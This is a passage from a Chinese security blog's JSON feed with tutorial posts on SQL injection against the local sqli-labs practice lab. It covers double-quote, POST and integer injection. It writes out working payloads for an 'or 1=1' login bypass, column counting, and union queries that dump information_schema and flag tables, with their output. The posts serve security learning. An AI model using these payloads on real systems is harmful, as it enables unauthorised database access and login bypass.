title=\"注入步骤(双引号注入)\"></a>注入步骤(双引号注入)</h2><p>Less-4是一道双引号注入的题目。</p>\n<p><img src=\"image-20220929221450837.png\" alt=\"image-20220929221450837\"></p>\n<p>由于查看发现是GET请求，因此礼节性地输入id=1</p>\n<p><img src=\"image-20220929221657747.png\" alt=\"image-20220929221657747\"></p>\n<h3 id=\"尝试注入类型-1\"><a href=\"#尝试注入类型-1\" class=\"headerlink\" title=\"尝试注入类型\"></a>尝试注入类型</h3><p>输入1’  来看看是否报错</p>\n<p><img src=\"image-20220929221831821.png\" alt=\"image-20220929221831821\"></p>\n<p>不报错，怀疑存在双引号注入。</p>\n<p>输入1“  来看看是否报错</p>\n<p><img src=\"image-20220929221918225.png\" alt=\"image-20220929221918225\"></p>\n<p>那么，<code>&quot;1&quot;&quot;) LIMIT 0,1</code>中，”1””)  外面包裹的【两个双引号 + 一个小括号】是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型-1\"><a href=\"#确定注入类型-1\" class=\"headerlink\" title=\"确定注入类型\"></a>确定注入类型</h3><p>我们尝试：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-4</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;) --+</span><br></pre></td></tr></table></figure>\n<p>成功不报错。</p>\n<p><img src=\"image-20220929222215596.png\" alt=\"image-20220929222215596\"></p>\n<p>之后就可以愉快地<strong>确定列数</strong> + 使用<strong>联合查询泄露数据库信息</strong>了。</p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>通过闭合，确定单引号注入</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定列数为3</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">3</span> <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; order by 4 --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">sql查询失败</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.联合查询泄露数据库信息</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span>database() <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: emails,flag,users</span><br><span class=\"line\">Password: challenge</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(column_name), database() from information_schema.columns where table_schema=database() and table_name=&#x27;</span>flag<span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: flag,value</span></span><br><span class=\"line\"><span class=\"string\">Password: challenge</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.获取flag</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, flag, <span class=\"keyword\">value</span>)), database() <span class=\"keyword\">from</span> challenge.flag <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:<span class=\"keyword\">any</span>,flag8:sqlc,flag9:tasi,flag10:moo,flag12:<span class=\"literal\">false</span>,flag11:muse</span><br><span class=\"line\">Password: challenge</span><br></pre></td></tr></table></figure>\n<p>至此，字符型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "title": "POST注入",
            "date_published": "2022-09-29T13:49:22.000Z",
            "content_html": "<h1 id=\"SQL-注入之POST注入\"><a href=\"#SQL-注入之POST注入\" class=\"headerlink\" title=\"SQL 注入之POST注入\"></a>SQL 注入之POST注入</h1><p>本篇使用POST注入。</p>\n<h2 id=\"注入步骤\"><a href=\"#注入步骤\" class=\"headerlink\" title=\"注入步骤\"></a>注入步骤</h2><h3 id=\"尝试注入类型\"><a href=\"#尝试注入类型\" class=\"headerlink\" title=\"尝试注入类型\"></a>尝试注入类型</h3><p>输入1’  来看看是否报错</p>\n<p><img src=\"image-20220929203645441.png\" alt=\"image-20220929203645441\"></p>\n<p>果不其然，此输入框存在SQL注入。且报错信息为<code>use near &#39;&#39;1&#39;&#39; and password=&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>提取出错点发生在这一句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;1&#x27;&#x27; and password=&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>其中，1’ 是我们输入的，那么其查询语句基本上可以确定为：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>接着，查看其F12发现，网页发送的是POST请求。</p>\n<p><img src=\"image-20220929204011334.png\" alt=\"image-20220929204011334\"></p>\n<p>然后通过继续深入查询网页源代码的Elements可以得到，两个<code>&lt;input&gt;</code>标签对应的变量名，<strong>Username</strong>对应<strong>uname</strong>，<strong>Password</strong>对应<strong>passwd</strong></p>\n<p><img src=\"image-20220929204648604.png\" alt=\"image-20220929204648604\"></p>\n<p>那么就可以构造POST请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929204929486.png\" alt=\"image-20220929204929486\"></p>\n<p>那么，基本上可以确定，此题存在SQL注入之一——POST注入。</p>\n<h3 id=\"确定注入类型\"><a href=\"#确定注入类型\" class=\"headerlink\" title=\"确定注入类型\"></a>确定注入类型</h3><p>输入1’ # 查看是否依旧报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>不报错，说明是POST单引号注入。</p>\n<p><img src=\"image-20220929205132216.png\" alt=\"image-20220929205132216\"></p>\n<h3 id=\"是否可以构造非法查询\"><a href=\"#是否可以构造非法查询\" class=\"headerlink\" title=\"是否可以构造非法查询\"></a>是否可以构造非法查询</h3><p>由于</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>username是用单引号括起来的，为了让语法不出错，我们需要<strong>保留单引号</strong>。即，可以在<code>uname=1&#39; #&amp;passwd=1</code>的<code>&#39; #</code>之间<strong>插入我们想要的非法查询语句</strong>。</p>\n<p>因此，我们可以输入 1’ or 1=1 # 万能登录注入就会让查询语句变成：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span> #<span class=\"string\">&#x27; and password = &#x27;</span>xxx<span class=\"string\">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>构造POST请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; or 1=1 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>登录成功: </p>\n<p><img src=\"image-20220929205718001.png\" alt=\"image-20220929205718001\"></p>\n<h2 id=\"使用BurpSuit来做Post注入\"><a href=\"#使用BurpSuit来做Post注入\" class=\"headerlink\" title=\"使用BurpSuit来做Post注入\"></a>使用BurpSuit来做Post注入</h2><p>这里也稍微提及一下BurpSuit抓包工具的简单使用：</p>\n<h3 id=\"FireFox浏览器配置\"><a href=\"#FireFox浏览器配置\" class=\"headerlink\" title=\"FireFox浏览器配置\"></a>FireFox浏览器配置</h3><p>FireFox浏览器中，在”工具栏—选项—高级—连接设置“中，配置手动代理和端口号(127.0.0.1 : <strong>9090</strong>)</p>\n<p><img src=\"image-20220929210357211.png\" alt=\"image-20220929210357211\"></p>\n<h3 id=\"BurpSuit配置\"><a href=\"#BurpSuit配置\" class=\"headerlink\" title=\"BurpSuit配置\"></a>BurpSuit配置</h3><p>到BurpSuit里，”Proxy—Options—Proxy Listeners“中，设置好同样的代理地址和端口号（127.0.0.1 : <strong>9090</strong>）</p>\n<p><img src=\"image-20220929210527792.png\" alt=\"image-20220929210527792\"></p>\n<h3 id=\"令BurpSuit拦截到包\"><a href=\"#令BurpSuit拦截到包\" class=\"headerlink\" title=\"令BurpSuit拦截到包\"></a>令BurpSuit拦截到包</h3><p>点击FireFox的任意提交请求的按钮就可以令BurpSuit拦截到包。以FireFox为例就是，点击了这道题目中的<code>Submit按钮</code> 或 使用Hackbar的<code>Execute按钮</code>。</p>\n<p><img src=\"image-20220929210640596.png\" alt=\"image-20220929210640596\"></p>\n<p>④在内容中鼠标右键点击后选择Send to Reapeater</p>\n<p><img src=\"image-20220929210828967.png\" alt=\"image-20220929210828967\"></p>\n<p>⑤在Reapter中多次尝试修改注入内容来查看返回的包</p>\n<p>第一次注入尝试</p>\n<p><img src=\"image-20220929211038588.png\" alt=\"image-20220929211038588\"></p>\n<p>第二次注入尝试</p>\n<p><img src=\"image-20220929210956005.png\" alt=\"image-20220929210956005\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "整型注入",
            "date_published": "2022-09-28T16:27:56.000Z",
            "content_html": "<h1 id=\"SQL注入之整型注入\"><a href=\"#SQL注入之整型注入\" class=\"headerlink\" title=\"SQL注入之整型注入\"></a>SQL注入之整型注入</h1><p>本篇使用整型注入来从0到1进入“SQL注入”的大门。</p>\n<h2 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h2><p>当然是先安装phpStudy，然后一键傻瓜式安装后点击启动按钮</p>\n<p><img src=\"image-20220928202842147.png\" alt=\"image-20220928202842147\"></p>\n<p>之后点击MySQL管理器</p>\n<p><img src=\"image-20220928203059624.png\" alt=\"image-20220928203059624\"></p>\n<p>双击localhost，账户名root，密码root即可进入。</p>\n<p><img src=\"image-20220928203206981.png\" alt=\"image-20220928203206981\"></p>\n<p>打开浏览器，选择sqli</p>\n<p><img src=\"image-20220928203903223.png\" alt=\"image-20220928203903223\"></p>\n<p>选择第一个Setup</p>\n<p><img src=\"image-20220928203930840.png\" alt=\"image-20220928203930840\"></p>\n<p>出现这个界面，即完成了数据库的初始化</p>\n<p><img src=\"image-20220928203950837.png\" alt=\"image-20220928203950837\"></p>\n<p>点击后退键回到上一个页面，然后点击Less-1</p>\n<p><img src=\"image-20220928204115026.png\" alt=\"image-20220928204115026\"></p>\n<p>出现SQLI DUMB SERIES-1</p>\n<p><img src=\"image-20220928204123886.png\" alt=\"image-20220928204123886\"></p>\n<p>接下来以Less-2作为例子进行讲解：</p>\n<p><img src=\"image-20220928210728567.png\" alt=\"image-20220928210728567\"></p>\n<h2 id=\"SQL注入步骤\"><a href=\"#SQL注入步骤\" class=\"headerlink\" title=\"SQL注入步骤\"></a>SQL注入步骤</h2><h3 id=\"①判断是否有注入-判断是否未严格校验\"><a href=\"#①判断是否有注入-判断是否未严格校验\" class=\"headerlink\" title=\"①判断是否有注入(判断是否未严格校验)\"></a>①判断是否有注入(判断是否未严格校验)</h3><h4 id=\"1-可控参数的改变能否影响页面的显示结果\"><a href=\"#1-可控参数的改变能否影响页面的显示结果\" class=\"headerlink\" title=\"1)可控参数的改变能否影响页面的显示结果\"></a>1)可控参数的改变能否影响页面的显示结果</h4><p>网页让输入id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。</p>\n<p>点击查看网页源代码，在Network这里看到是GET请求。</p>\n<p><img src=\"image-20220928213756712.png\" alt=\"image-20220928213756712\"></p>\n<p>因此我们选择在链接后面加上id参数</p>\n<p><img src=\"image-20220928213510534.png\" alt=\"image-20220928213510534\"></p>\n<p>发现成功令其输出内容。</p>\n<p>此时我们再次改变GET请求中id的值，发现，内容会对应有所变化。</p>\n<p><img src=\"image-20220928214022889.png\" alt=\"image-20220928214022889\"></p>\n<h4 id=\"2-输入的SQL语句是否能报错\"><a href=\"#2-输入的SQL语句是否能报错\" class=\"headerlink\" title=\"2)输入的SQL语句是否能报错\"></a>2)输入的SQL语句是否能报错</h4><p>因为能通过数据库的报错，看到数据库的一些语句痕迹</p>\n<p>我们假设它后台的查询语句是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> $id</span><br></pre></td></tr></table></figure>\n<p>猜想：能否通过加单引号令其出错？</p>\n<p>因为：</p>\n<p>如果是整型注入漏洞，则像3’这样的字符传入$id处会引发错误。</p>\n<p>如果是单引号注入漏洞，像3’这样的字符传入$id处也会引发错误。</p>\n<p><img src=\"image-20220928214501924.png\" alt=\"image-20220928214501924\"></p>\n<p>黄字部分的报错语句，非常之重要！</p>\n<p>near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第1行的xxxxxxx语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是“输出了单引号后面的语句”——LIMIT 0,1。</p>\n<p>为了再次确定near ‘xxxxxxxxxx’ at line 1中在LIMIT 0,1之前的一个单引号是我们输入的单引号，我们再次改变GET请求中” ‘ ‘“（单引号）变为” “ “（双引号）</p>\n<p><img src=\"image-20220928215359897.png\" alt=\"image-20220928215359897\"></p>\n<p>发现成功令报错信息中near ‘xxxxx’中的LIMIT前一个符号发生改变。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，加入单引号会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; limit 0,1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#如果是单引号注入，加入单引号也会报错</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27;&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>据目前输入的结果来看，此网页存在“整型注入”或者“单引号注入”</p>\n<h4 id=\"3-输入的SQL语句能否不报错\"><a href=\"#3-输入的SQL语句能否不报错\" class=\"headerlink\" title=\"3)输入的SQL语句能否不报错\"></a>3)输入的SQL语句能否不报错</h4><p>为了查看我们的语句能够成功闭合</p>\n<p>那怎么区分到底是整型还是单引号呢？</p>\n<p>使用 # 来注释后面语句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#加入#号后，两个语法依旧错误，故都会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; # limit 0,1</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27; #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>结果确实是报错。</p>\n<p><img src=\"image-20220928220327744.png\" alt=\"image-20220928220327744\"></p>\n<p>接下来我们删掉单引号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，则删掉单引号，保留#号后，不会报错！</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> # limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"string\">&#x27;2 #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928220529170.png\" alt=\"image-20220928220529170\"></p>\n<h3 id=\"②什么类型的注入\"><a href=\"#②什么类型的注入\" class=\"headerlink\" title=\"②什么类型的注入\"></a>②什么类型的注入</h3><p>因此，此处经过上述报错信息确定，存在<strong>整型注入</strong>！</p>\n<h3 id=\"③语句是否能够被恶意修改\"><a href=\"#③语句是否能够被恶意修改\" class=\"headerlink\" title=\"③语句是否能够被恶意修改\"></a>③语句是否能够被恶意修改</h3><p>恶意修改主要指能否再加入一些我们想要的判断条件，比如：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span># limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>如果是整型注入无误，这里条件为“id = 2 and 0”——这是永假条件，则不会有任何查询结果。</p>\n<p><img src=\"image-20220928221547372.png\" alt=\"image-20220928221547372\"></p>\n<p>结果正如我们所料，空空如也。</p>\n<h3 id=\"④是否能够成功执行\"><a href=\"#④是否能够成功执行\" class=\"headerlink\" title=\"④是否能够成功执行\"></a>④是否能够成功执行</h3><p>第三个能满足，其实第四个就顺带就OK。</p>\n<h3 id=\"⑤获取我们想要的数据\"><a href=\"#⑤获取我们想要的数据\" class=\"headerlink\" title=\"⑤获取我们想要的数据\"></a>⑤获取我们想要的数据</h3><p>关键数据是保存在数据库里面的，关系如下：</p>\n<p>数据库-&gt;表-&gt;字段-&gt;值</p>\n<p>打开MySQL，我们可以看到其中有information_schema库（这是MySQL自带的库，管理所有表信息）</p>\n<p><img src=\"image-20220928223622076.png\" alt=\"image-20220928223622076\"></p>\n<p>这个库中有三个表非常值得我们关注：</p>\n<p>Schemata表（包含所有的<code>库名信息</code>）、Tables表（包含所有的<code>表名信息</code>）、Columns表（包含所有的<code>列名信息</code>）</p>\n<p><strong>首先是Schemeta表</strong>，<code>schema_name</code>对应着所有数据库的名字。</p>\n<p><img src=\"image-20220928224006640.png\" alt=\"image-20220928224006640\"></p>\n<p><strong>其次是Tables表</strong>，<code>table_name</code>这个列里，存储了<code>table_schema对应的库</code>下面的所有表</p>\n<p><img src=\"image-20220928224135720.png\" alt=\"image-20220928224135720\"></p>\n<p><strong>最后是Columns表</strong>，通过<code>table_schema</code>对应的库，<code>table_name</code>对应的表，<strong>使用column_name对应的列名，来唯一地定位某个列</strong>。</p>\n<p><img src=\"image-20220928224405698.png\" alt=\"image-20220928224405698\"></p>\n<h4 id=\"1）构造联合查询\"><a href=\"#1）构造联合查询\" class=\"headerlink\" title=\"1）构造联合查询\"></a>1）构造联合查询</h4><p>确定的整型注入中，我们需要构造出我们想要的查询内容，比如在<strong>information_schema库</strong>的<strong>Schema表</strong>中获取<code>schema_name</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225341595.png\" alt=\"image-20220928225341595\"></p>\n<p>但如果像上面这样构造，会报错，我们需要使用到联合查询。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225106827.png\" alt=\"image-20220928225106827\"></p>\n<p>但是，如果像上面这样构造，依旧会报错，在SQL查询中，union前后的两个列++<strong>需要列数完全一致才可拼接</strong>++。</p>\n<p>因此，需要使用占位符来定位前面的查询是多少列：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#占位一个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span> #</span><br><span class=\"line\">#占位两个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span> #</span><br><span class=\"line\">#占位三个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> #</span><br><span class=\"line\">....</span><br></pre></td></tr></table></figure>\n<p>注意，这里的1,2,3可以填任何数字或者符号，仅仅为了占位使用，<strong>可以被任意“想要看到的输出内容”覆盖</strong>。</p>\n<p>经过多次定位，我们最终得到：<strong>前面的查询</strong>使用到的是<strong>3个列</strong>。</p>\n<p><img src=\"image-20220928225313035.png\" alt=\"image-20220928225313035\"></p>\n<p>因此有：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225608030.png\" alt=\"image-20220928225608030\"></p>\n<p>虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用union查询，<strong>还有个bug</strong>就是如果前面的查询有效，<strong>最终结果会在前面查询到的结尾后面拼接</strong>。</p>\n<p>为了让后面查询到的内容（我们<code>想要看到的数据</code>）提前，<strong>我们需要令前面的查询失效</strong>，简单的方法就是令id = 39888 这样平常不会使用的奇怪数字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225926603.png\" alt=\"image-20220928225926603\"></p>\n<h4 id=\"2）拼接多组内容在同一行输出、寻找所在库\"><a href=\"#2）拼接多组内容在同一行输出、寻找所在库\" class=\"headerlink\" title=\"2）拼接多组内容在同一行输出、寻找所在库\"></a>2）拼接多组内容在同一行输出、寻找所在库</h4><p>OK，我们在第二个占位符（也就是数字2所在的位置）上，看到输出了一个schema_name，但是我们想要输出所有的schema_name，怎么办？</p>\n<p>使用MySQL 查询语句提供的group_concat()函数</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), schema_name <span 